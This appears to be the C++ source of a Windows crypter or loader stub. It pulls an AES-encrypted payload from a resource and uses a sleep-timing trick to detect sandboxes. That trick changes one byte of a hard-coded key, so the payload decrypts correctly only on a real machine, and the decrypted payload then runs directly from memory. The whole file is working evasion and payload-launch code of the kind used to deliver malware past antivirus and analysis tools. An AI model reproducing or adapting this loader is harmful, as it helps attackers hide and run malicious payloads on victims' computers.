#include "stdafx.h"
#include "aes256.h"
#include "resourcemanager.h"
#include <stdlib.h>
//#include <stdio.h>

int isCodeExecuted() {
	SYSTEMTIME st1, st2;
	do {
		GetSystemTime(&st1);
		Sleep(2000);
		GetSystemTime(&st2);
	} while (st1.wMinute != st2.wMinute);

	if (st2.wSecond - st1.wSecond > 1) {
		return 1;
	} else {
		return 0;
	}
}

int APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)
{
	//********* read resource **********************
	unsigned long dwSize;
	unsigned char* resourcePtr = ResourceManager::GetResource(132, "BIN", &dwSize);
	if (resourcePtr == NULL) return 0;
	//**********************************************

	//********* copy to heap **********************
	unsigned char* lpMemory = (unsigned char*)malloc(dwSize);
	memset(lpMemory,0,dwSize);
	memcpy (lpMemory, resourcePtr, dwSize);
	//*********************************************

	//********* check if code is executed *********
	int isExecuted = isCodeExecuted();
	//*********************************************

	//********* AES decryption ********************
	unsigned char keyVal;
	if (isExecuted) {
		keyVal = 0x7d;
	} else {
		keyVal = 0x61;
	}
	unsigned char key[32] = {
		0x53, 0x28, 0x40, 0x6e, 0x2f, 0x64, 0x63, 0x5d, 0x2d, 0x61, 0x77, 0x40, 0x76, 0x71, 0x77, 0x28, 
		0x74, 0x61, keyVal, 0x66, 0x61, 0x73, 0x3b, 0x5d, 0x66, 0x6d, 0x3c, 0x3f, 0x7b, 0x66, 0x72, 0x36
	};

	aes256_context ctx;
	aes256_init(&ctx, key);

	unsigned char *buf;

	for (unsigned long i = 0; i < dwSize/16; i++) {
		buf = lpMemory + (i * 16);
		aes256_decrypt_ecb(&ctx, buf);
	}

	aes256_done(&ctx);
	//*********************************************

	//********* execute ***********
	ResourceManager::RunFromMemory(lpMemory,__argv[0]);
	//*****************************

	/*FILE *outFile = fopen("decrypted.dat", "wb");
	fwrite(text, size, 1, outFile);
	fclose (outFile);*/

	return 0;
}
